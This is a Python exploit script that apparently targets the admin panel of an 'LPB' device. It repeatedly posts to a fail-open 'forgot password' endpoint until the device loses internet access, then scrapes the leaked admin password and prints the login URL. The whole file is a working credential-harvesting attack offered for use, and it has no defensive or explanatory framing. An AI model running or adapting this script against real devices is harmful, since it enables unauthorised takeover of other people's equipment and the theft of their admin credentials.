#!/usr/bin/env python3
"""
Quick LPB Admin Password Leak Tester
Run continuously until internet goes down, then harvests the password.

Usage: python3 quick_leak.py [target_ip]
"""

import requests
import sys
import re
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"

def try_leak():
    """Try the fail-open on admin forgot endpoint (no captcha needed)"""
    url = f"http://{TARGET}/admin/index?execute=1&exec=forgot"
    data = {"license": "0", "sdcard": "1234567890"}
    
    try:
        resp = requests.post(url, data=data, timeout=30)
        text = resp.text.strip()
        
        if "Your admin password is" in text:
            match = re.search(r"Your admin password is:\s*(.+)", text)
            if match:
                return f"PASSWORD: {match.group(1).strip()}"
        elif "invalid" in text:
            return "still online"
        elif "timeout" in text.lower():
            return "timeout"
        else:
            return f"unexpected: {text[:60]}"
    except requests.exceptions.Timeout:
        return "timeout"
    except Exception as e:
        return f"error: {e}"

print(f"LPB Password Leak Monitor - {TARGET}")
print("Waiting for internet to drop...")
print()

while True:
    result = try_leak()
    if result.startswith("PASSWORD"):
        print(f"\n{'='*50}")
        print(f"[+] {result}")
        print(f"Login: http://{TARGET}/admin/index.php")
        print(f"{'='*50}")
        break
    else:
        ts = time.strftime("%H:%M:%S")
        print(f"[{ts}] {result}")
        time.sleep(5)
